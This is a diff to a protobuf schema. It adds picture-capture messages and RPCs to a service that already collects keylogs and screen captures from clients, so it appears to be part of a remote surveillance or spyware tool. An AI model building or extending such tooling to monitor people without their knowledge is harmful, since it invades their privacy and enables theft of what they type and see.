@@ -56,6 +56,15 @@ message ScreenOutput {
     ClientDataRequest id = 2;
 }
 
+message PictureData {
+    bool shouldTakePicture = 1;
+}
+
+message PictureOutput {
+    bytes PictureData = 1;
+    ClientDataRequest id = 2;
+}
+
 message ClientDataRequest { string client_id = 1; }
 
 message ClientDataOnScreenTextResponse { ClientOnScreenData on_screen = 1; }
@@ -71,4 +80,6 @@ service Consumer {
     rpc SetKeylogOutput(KeylogOutput) returns (Void);
     rpc GetScreen(ClientDataRequest) returns (ScreenData);
     rpc SetScreenOutput(ScreenOutput) returns (Void);
+    rpc GetPicture(ClientDataRequest) returns (PictureData);
+    rpc SetPictureOutput(PictureOutput) returns (Void);
 }
